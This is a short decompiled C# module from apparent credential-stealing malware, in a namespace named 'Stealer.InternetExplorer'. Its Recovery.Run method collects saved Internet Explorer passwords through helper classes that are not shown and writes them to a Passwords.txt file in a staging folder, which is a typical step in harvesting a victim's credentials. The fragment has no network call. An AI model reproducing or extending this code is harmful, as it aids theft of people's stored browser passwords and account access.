using System;
using System.Collections.Generic;
using System.IO;

namespace Stealer.InternetExplorer
{
	// Token: 0x0200002A RID: 42
	internal sealed class Recovery
	{
		// Token: 0x060000C2 RID: 194 RVA: 0x00006F60 File Offset: 0x00005160
		public static void Run(string sSavePath)
		{
			List<Password> list = cPasswords.Get();
			if (list.Count != 0)
			{
				Directory.CreateDirectory(sSavePath + "\\InternetExplorer");
				cBrowserUtils.WritePasswords(list, sSavePath + "\\InternetExplorer\\Passwords.txt");
			}
		}
	}
}
